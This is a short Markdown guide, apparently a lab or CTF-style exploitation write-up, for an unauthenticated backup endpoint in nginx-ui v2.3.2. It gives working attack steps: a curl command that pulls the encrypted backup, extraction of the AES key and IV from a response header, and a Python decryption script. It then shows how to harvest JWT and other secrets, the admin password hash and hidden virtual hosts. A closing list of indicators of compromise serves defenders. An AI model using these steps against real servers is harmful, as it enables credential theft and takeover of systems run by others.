# nginx-ui Unauthenticated Backup Exploitation

## Summary
nginx-ui v2.3.2 exposes `/api/backup` without authentication. Returns AES-256-CBC encrypted ZIP containing full server configuration.

## Attack Steps

### 1. Download Backup
```bash
curl -s -D /tmp/backup_headers http://target:9000/api/backup -o /tmp/backup.zip
```

### 2. Extract Key/IV from Response Headers
```bash
# Header format: X-Backup-Security: <base64_key>:<base64_iv>
grep X-Backup-Security /tmp/backup_headers
# X-Backup-Security: s9eroUh7905bzSuA6UuYD+kkrQJ4NbhCxtl4ocYnkxc=:57nKUBtv3SYo0L476GgvYQ==
```

### 3. Decrypt
```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = base64.b64decode('s9eroUh7905bzSuA6UuYD+kkrQJ4NbhCxtl4ocYnkxc=')  # 32 bytes
iv = base64.b64decode('57nKUBtv3SYo0L476GgvYQ==')  # 16 bytes

with open('/tmp/backup.zip', 'rb') as f:
    data = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(data), 16)

with open('/tmp/backup_decrypted.zip', 'wb') as f:
    f.write(decrypted)
```

### 4. Extract and Analyze
```bash
unzip backup_decrypted.zip
# Contains: app.ini, database.db, nginx config dir
```

### 5. Secrets in app.ini
- `[app] JwtSecret` — JWT signing secret
- `[node] Secret` — Node communication secret
- `[crypto] Secret` — Internal crypto secret

### 6. SQLite Database
```bash
sqlite3 database.db ".tables"
# Key tables: users (admin bcrypt hash), sites, site_configs, certs, acme_users
```

### 7. Hidden Vhosts
Check `sites-available/` for hash-named vhost configs like `3cb0cc979db614aaa76d782e4dd82f77.conf`

## Indicators of Compromise
- Unauthenticated access to `/api/backup`
- `X-Backup-Security` header in response
- Backup contains full nginx config + nginx-ui database
- Version 2.3.2+ confirmed vulnerable
